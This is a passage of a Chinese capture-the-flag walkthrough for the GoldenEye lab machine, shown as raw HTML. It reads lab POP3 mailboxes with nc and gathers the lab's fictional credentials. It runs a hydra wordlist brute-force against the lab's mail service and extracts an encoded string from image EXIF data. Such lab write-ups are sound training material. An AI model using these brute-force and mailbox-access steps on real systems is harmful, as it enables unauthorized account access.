data-num=\"6\"></td><td><pre>Received: from ok <span class=\"token punctuation\">(</span>localhost <span class=\"token punctuation\">[</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        by ubuntu <span class=\"token punctuation\">(</span>Postfix<span class=\"token punctuation\">)</span> with ESMTP <span class=\"token function\">id</span> C3F2B454B1</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token operator\">&lt;</span>boris<span class=\"token operator\">></span><span class=\"token punctuation\">;</span> Tue, <span class=\"token number\">21</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">19</span>:42:35 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Message-Id: <span class=\"token operator\">&lt;</span><span class=\"token number\">20180425024249</span>.C3F2B454B1@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Date: Tue, <span class=\"token number\">21</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">19</span>:42:35 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>From: natalya@ubuntu</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Boris, I can <span class=\"token builtin class-name\">break</span> your codes<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Boris,我能破解你的密码！</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>来自：natalya@ubuntu</pre></td></tr></table></figure><p><code>retr 3</code>  阅读第三封邮件</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>retr <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+OK <span class=\"token number\">921</span> octets</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Return-Path: <span class=\"token operator\">&lt;</span>alec@janus.boss<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>X-Original-To: boris</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Delivered-To: boris@ubuntu</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Received: from janus <span class=\"token punctuation\">(</span>localhost <span class=\"token punctuation\">[</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        by ubuntu <span class=\"token punctuation\">(</span>Postfix<span class=\"token punctuation\">)</span> with ESMTP <span class=\"token function\">id</span> 4B9F4454B1</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token operator\">&lt;</span>boris<span class=\"token operator\">></span><span class=\"token punctuation\">;</span> Wed, <span class=\"token number\">22</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">19</span>:51:48 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Message-Id: <span class=\"token operator\">&lt;</span><span class=\"token number\">20180425025235</span>.4B9F4454B1@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Date: Wed, <span class=\"token number\">22</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">19</span>:51:48 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>From: alec@janus.boss</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Boris,</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Your cooperation with our syndicate will pay off big. Attached are the final access codes <span class=\"token keyword\">for</span> GoldenEye. Place them <span class=\"token keyword\">in</span>  hidden <span class=\"token function\">file</span> within the root directory of this server <span class=\"token keyword\">then</span> remove from this email. There can only be one <span class=\"token builtin class-name\">set</span> of these aces codes, and we need to secure them <span class=\"token keyword\">for</span> the final execution. If they are retrieved and captured our plan will crash ad burn<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our inal stages<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>PS - Keep security tight or we will be compromised.</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>Boris，</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>您与我们集团的合作将会带来丰厚的回报。 随附的是 GoldenEye 的最终访问代码。 将它们放入该服务器root目录中的隐藏文件中，然后从该电子邮件中删除。 这些 ace 代码只能有一组，我们需要保护它们以便最终执行。 如果它们被找回并捕获，我们的计划就会崩溃！</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>一旦 Xenia 进入培训站点并熟悉 GoldenEye 终端代码，我们将进入最后阶段<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>PS - 保持严格的安全措施，否则我们将受到损害。</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>来自：alec@janus.boss</pre></td></tr></table></figure><p>关键信息：</p>\n<p>flag 在服务器 root 目录的隐藏文件中</p>\n<p>Natalya 能破解 Boris 的密码</p>\n<p>登录 Natalya 的邮箱</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token number\">192.168</span>.222.130 <span class=\"token number\">55007</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+OK GoldenEye POP3 Electronic-Mail System</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>user natalya</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>+OK</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pass bird</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>+OK Logged in.</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>list</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>+OK <span class=\"token number\">2</span> messages:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token number\">631</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">2</span> <span class=\"token number\">1048</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>retr <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>+OK <span class=\"token number\">631</span> octets</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Return-Path: <span class=\"token operator\">&lt;</span>root@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>X-Original-To: natalya</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Delivered-To: natalya@ubuntu</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Received: from ok <span class=\"token punctuation\">(</span>localhost <span class=\"token punctuation\">[</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        by ubuntu <span class=\"token punctuation\">(</span>Postfix<span class=\"token punctuation\">)</span> with ESMTP <span class=\"token function\">id</span> D5EDA454B1</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token operator\">&lt;</span>natalya<span class=\"token operator\">></span><span class=\"token punctuation\">;</span> Tue, <span class=\"token number\">10</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">19</span>:45:33 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Message-Id: <span class=\"token operator\">&lt;</span><span class=\"token number\">20180425024542</span>.D5EDA454B1@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Date: Tue, <span class=\"token number\">10</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">19</span>:45:33 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>From: root@ubuntu</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>Natalya, please you need to stop breaking boris<span class=\"token string\">' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>.</pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>Natalya，请你停止破解Boris的密码。 此外，您还是 GNO 培训主管。 一旦为您指定了学生，我会向您发送电子邮件。</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>另外，请警惕可能的网络入侵。 我们得到情报称，黄金眼正在受到一个名叫Janus的犯罪集团的追捕。</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>来自：root@ubuntu</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>retr 2</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>+OK 1048 octets</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>Return-Path: &lt;root@ubuntu></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>X-Original-To: natalya</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>Delivered-To: natalya@ubuntu</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>Received: from root (localhost [127.0.0.1])</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        by ubuntu (Postfix) with SMTP id 17C96454B1</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        for &lt;natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>Message-Id: &lt;20180425031956.17C96454B1@ubuntu></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>From: root@ubuntu</pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it'</span>s related to security<span class=\"token punctuation\">..</span>.even <span class=\"token keyword\">if</span> it<span class=\"token string\">'s not, just enter it in under the guise of \"security\"...it'</span>ll get the change order escalated without much hassle <span class=\"token builtin class-name\">:</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>Ok, user creds are:</pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>username: xenia</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>password: RCP90rulez<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>Boris verified her as a valid contractor so just create the account ok?</pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>And <span class=\"token keyword\">if</span> you didn<span class=\"token string\">'t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>**Make sure to edit your host file since you usually work remote off-network....</pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>Since you'</span>re a Linux user just point this servers IP to severnaya-station.com <span class=\"token keyword\">in</span> /etc/hosts.</pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>好的，Natalyn，我给你带来了一个新学生。 由于这是一个新系统，如果您发现任何配置问题，请告诉我或Boris，特别是它是否与安全相关<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>即使不是，只需以“安全”为幌子输入<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>它就会 轻松升级变更单:<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>好的，用户凭证是：</pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>用户名：xenia</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>密码：RCP90rulez<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>Boris验证了她是有效的承包商，所以只需创建帐户即可，好吗？</pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>如果您没有外部内部域上的 URL：severnaya-station.com/gnocertdir</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>**请确保编辑您的主机文件，因为您通常在离线状态下远程工作<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>由于您是 Linux 用户，只需将此服务器 IP 指向 /etc/hosts 中的 severnaya-station.com 即可。</pre></td></tr></table></figure><p>关键信息：</p>\n<p>URL： <code>severnaya-station.com/gnocertdir</code></p>\n<p>将此服务器 IP 指向 <code> /etc/hosts</code>  中的  <code>severnaya-station.com</code></p>\n<p>用户名： <code>xenia</code> <br />\n 密码： <code>RCP90rulez!</code></p>\n<p>配置 <code> /etc/hosts</code>  ，<a href=\"http://xn--severnaya-station-mk81aj497f.com/gnocertdir%E7%BD%91%E7%AB%99%E7%99%BB%E5%BD%95xenia%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9D%A5%E8%87%AADr_Doak%E7%9A%84%E6%B6%88%E6%81%AF\">进入 severnaya-station.com/gnocertdir 网站登录 xenia，发现来自 Dr_Doak 的消息</a></p>\n<p>Page path：</p>\n<pre><code>Home / ► My profile / ► Messages\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"image-20240514105928843.png\" alt=\"image-20240514105928843\" /></p>\n<p>关键信息：</p>\n<p>My email username is...doak</p>\n<p>又得到一个邮箱的用户名，直接拿九头蛇爆破他</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-l</span> doak <span class=\"token parameter variable\">-P</span> /usr/share/wordlists/fasttrack.txt <span class=\"token number\">192.168</span>.222.130 <span class=\"token parameter variable\">-s</span> <span class=\"token number\">55007</span> pop3</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">55007</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>pop3<span class=\"token punctuation\">]</span> host: <span class=\"token number\">192.168</span>.222.130   login: doak   password: goat</pre></td></tr></table></figure><p>登录 doak 邮箱查看邮件</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token number\">192.168</span>.222.130 <span class=\"token number\">55007</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+OK GoldenEye POP3 Electronic-Mail System</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>user doak</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>+OK</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pass goat      </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>+OK Logged in.</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>list</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>+OK <span class=\"token number\">1</span> messages:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token number\">606</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>retr <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>+OK <span class=\"token number\">606</span> octets</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Return-Path: <span class=\"token operator\">&lt;</span>doak@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>X-Original-To: doak</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Delivered-To: doak@ubuntu</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Received: from doak <span class=\"token punctuation\">(</span>localhost <span class=\"token punctuation\">[</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        by ubuntu <span class=\"token punctuation\">(</span>Postfix<span class=\"token punctuation\">)</span> with SMTP <span class=\"token function\">id</span> 97DC24549D</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token operator\">&lt;</span>doak<span class=\"token operator\">></span><span class=\"token punctuation\">;</span> Tue, <span class=\"token number\">30</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">20</span>:47:24 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Message-Id: <span class=\"token operator\">&lt;</span><span class=\"token number\">20180425034731</span>.97DC24549D@ubuntu<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Date: Tue, <span class=\"token number\">30</span> Apr <span class=\"token number\">1995</span> <span class=\"token number\">20</span>:47:24 <span class=\"token parameter variable\">-0700</span> <span class=\"token punctuation\">(</span>PDT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>From: doak@ubuntu</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>James,</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>If you<span class=\"token string\">'re reading this, congrats you'</span>ve gotten this far. You know how tradecraft works right?</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>Because I don't. Go to our training site and login to my account<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>dig <span class=\"token keyword\">until</span> you can exfiltrate further information<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>username: dr_doak</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>password: 4England<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>James,</pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>如果您正在阅读本文，那么恭喜您已经走到这一步了。你知道谍报技术是如何运作的吧？</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>因为我不知道。转到我们的培训网站并登录我的帐户<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>挖掘，直到你能获得进一步的信息<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>用户名：dr_doak</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>密码：4England<span class=\"token operator\">!</span></pre></td></tr></table></figure><p>得到 doak 的培训账号，这个 James 是谁，难道是我？</p>\n<p>用户名：dr_doak<br />\n 密码：4England!</p>\n<p>进入培训网站登录 doak 博士的账号</p>\n<p>发现一个新用户，是管理员。</p>\n<p>Page path：</p>\n<pre><code>Home / ► My profile / ► Messages\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"image-20240514112817572.png\" alt=\"image-20240514112817572\" /></p>\n<p>发现给 James 的文件：s3cret.txt</p>\n<p>Page path：</p>\n<pre><code>Home / ► My home\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"image-20240514113203301.png\" alt=\"image-20240514113203301\" /></p>\n<p>下载下来看看：</p>\n<figure class=\"highlight txt\"><figcaption data-lang=\"txt\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>007,</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>I was able to capture this apps adm1n cr3ds through clear txt. </pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Something juicy is located here: /dir007key/for-007.jpg</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>007,</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>我能够通过clear txt捕获这个应用程序admin 凭据。</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>GoldenEye 服务器中的大多数 Web 应用程序中的文本都会被扫描，因此我无法在此处添加凭据。</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>这里有些有趣的东西:/dir007key/for-007.jpg</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>您也可能知道，RCP-90 比任何其他武器都优越得多，而《杀人执照》是唯一的游戏方式。</pre></td></tr></table></figure><p>难道我是 007？🤔</p>\n<p>收集到新目录：/dir007key/for-007.jpg</p>\n<p>去看看：<a href=\"http://severnaya-station.com//dir007key/for-007.jpg\">severnaya-station.com//dir007key/for-007.jpg</a></p>\n<p>一张抽象的图片，通过这张图片能得到 admin 的凭据</p>\n<p>应该是有隐写，下载下来看看</p>\n<p><img loading=\"lazy\" data-src=\"for-007-1715658834141-1.jpg\" alt=\"for-007\" /></p>\n<p>使用 exiftool、binwalk、strings 都行</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>exiftool for-007.jpg</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ExifTool Version Number         <span class=\"token builtin class-name\">:</span> <span class=\"token number\">12.76</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>File Name                       <span class=\"token builtin class-name\">:</span> for-007.jpg</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Directory                       <span class=\"token builtin class-name\">:</span> <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>File Size                       <span class=\"token builtin class-name\">:</span> <span class=\"token number\">15</span> kB</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>File Modification Date/Time     <span class=\"token builtin class-name\">:</span> <span class=\"token number\">2018</span>:04:25 08:40:02+08:00</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>File Access Date/Time           <span class=\"token builtin class-name\">:</span> <span class=\"token number\">2024</span>:05:14 <span class=\"token number\">11</span>:52:01+08:00</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>File Inode Change Date/Time     <span class=\"token builtin class-name\">:</span> <span class=\"token number\">2024</span>:05:14 <span class=\"token number\">11</span>:51:51+08:00</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>File Permissions                <span class=\"token builtin class-name\">:</span> -rw-r--r--</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>File Type                       <span class=\"token builtin class-name\">:</span> JPEG</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>File Type Extension             <span class=\"token builtin class-name\">:</span> jpg</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>MIME Type                       <span class=\"token builtin class-name\">:</span> image/jpeg</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>JFIF Version                    <span class=\"token builtin class-name\">:</span> <span class=\"token number\">1.01</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>X Resolution                    <span class=\"token builtin class-name\">:</span> <span class=\"token number\">300</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Y Resolution                    <span class=\"token builtin class-name\">:</span> <span class=\"token number\">300</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Exif Byte Order                 <span class=\"token builtin class-name\">:</span> Big-endian <span class=\"token punctuation\">(</span>Motorola, MM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Image Description               <span class=\"token builtin class-name\">:</span> <span class=\"token assign-left variable\">eFdpbnRlcjE5OTV4IQ</span><span class=\"token operator\">==</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Make                            <span class=\"token builtin class-name\">:</span> GoldenEye</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Resolution Unit                 <span class=\"token builtin class-name\">:</span> inches</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Software                        <span class=\"token builtin class-name\">:</span> linux</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Artist                          <span class=\"token builtin class-name\">:</span> For James</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>Y Cb Cr Positioning             <span class=\"token builtin class-name\">:</span> Centered</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>Exif Version                    <span class=\"token builtin class-name\">:</span> 0231</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>Components Configuration        <span class=\"token builtin class-name\">:</span> Y, Cb, Cr, -</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>User Comment                    <span class=\"token builtin class-name\">:</span> For 007</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>Flashpix Version                <span class=\"token builtin class-name\">:</span> 0100</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>Image Width                     <span class=\"token builtin class-name\">:</span> <span class=\"token number\">313</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>Image Height                    <span class=\"token builtin class-name\">:</span> <span class=\"token number\">212</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>Encoding Process                <span class=\"token builtin class-name\">:</span> Baseline DCT, Huffman coding</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>Bits Per Sample                 <span class=\"token builtin class-name\">:</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>Color Components                <span class=\"token builtin class-name\">:</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>Y Cb Cr Sub Sampling            <span class=\"token builtin class-name\">:</span> YCbCr4:4:4 <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>Image Size                      <span class=\"token builtin class-name\">:</span> 313x212</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>Megapixels                      <span class=\"token builtin class-name\">:</span> <span class=\"token number\">0.066</span></pre></td></tr></table></figure><p>发现一个 <code>eFdpbnRlcjE5OTV4IQ==</code>  